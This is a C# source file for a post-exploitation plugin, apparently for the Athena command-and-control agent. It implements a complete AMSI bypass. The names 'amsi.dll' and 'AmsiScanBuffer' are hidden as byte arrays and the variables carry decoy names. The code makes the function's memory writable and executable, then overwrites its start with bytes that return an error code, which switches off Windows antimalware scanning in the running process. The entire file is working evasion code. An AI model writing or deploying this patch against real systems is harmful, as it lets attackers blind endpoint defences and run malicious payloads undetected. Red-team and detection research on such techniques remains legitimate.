using PluginBase;
using System;
using System.Collections.Generic;
using System.Runtime.InteropServices;
using System.Text;

namespace Plugin
{
    public static class amsi
    {
        static byte[] sword = new byte[] { 0xB8, 0x57, 0x00, 0x07, 0x80, 0xC3 };
        static byte[] spear = new byte[] { 0xB8, 0x57, 0x00, 0x07, 0x80, 0xC2, 0x18, 0x00 };


        [DllImport("kernel32")]
        public static extern IntPtr LoadLibrary(string name);
        [DllImport("kernel32")]
        public static extern IntPtr GetProcAddress(IntPtr hModule, string procName);
        [DllImport("kernel32")]
        public static extern bool VirtualProtect(IntPtr lpAddress, UIntPtr dwSize, uint flNewProtect, out uint lpflOldProtect);
        [DllImport("kernel32.dll", EntryPoint = "RtlMoveMemory", SetLastError = false)]
        static extern void MoveMemory(IntPtr dest, IntPtr src, int size);
        public static ResponseResult Execute(Dictionary<string, object> args)
        {
            try
            {
                if (Environment.Is64BitProcess)
                {
                    if (SpearAndShield(sword))
                    {
                        return new ResponseResult
                        {
                            completed = "true",
                            user_output = "Success",
                            task_id = (string)args["task-id"], //task-id passed in from Athena
                        };
                    }
                }
                else
                {
                    if (SpearAndShield(spear))
                    {
                        return new ResponseResult
                        {
                            completed = "true",
                            user_output = "Success",
                            task_id = (string)args["task-id"], //task-id passed in from Athena
                        };
                    }
                }
                return new ResponseResult
                {
                    completed = "true",
                    user_output = "Failed",
                    task_id = (string)args["task-id"], //task-id passed in from Athena
                    status = "error"
                };
            }
            catch (Exception e)
            {
                //oh no an error
                return new ResponseResult
                {
                    completed = "true",
                    user_output = e.Message,
                    task_id = (string)args["task-id"],
                    status = "error"
                };
            }
        }
        
        private static bool SpearAndShield(byte[] shield)
        {
            try
            {
                byte[] bSword = new byte[] { 0x61, 0x6d, 0x73, 0x69, 0x2e, 0x64, 0x6c, 0x6c };
                IntPtr pSword = LoadLibrary(Encoding.ASCII.GetString(bSword));

                if (pSword == IntPtr.Zero)
                {
                    return false;
                }


                byte[] bufSword = new byte[] { 0x41, 0x6d, 0x73, 0x69, 0x53, 0x63, 0x61, 0x6e, 0x42, 0x75, 0x66, 0x66, 0x65, 0x72 };
                IntPtr pShield = GetProcAddress(pSword, Encoding.ASCII.GetString(bufSword));
                if (pShield == IntPtr.Zero)
                {
                    return false;
                }

                uint uCape;
                if (!VirtualProtect(pShield, (UIntPtr)shield.Length, 0x40, out uCape))
                {
                    return false;
                }

                Marshal.Copy(shield, 0, pShield, shield.Length);
                return true;
            }
            catch (Exception e)
            {
                return false;
            }
        }
    }
}
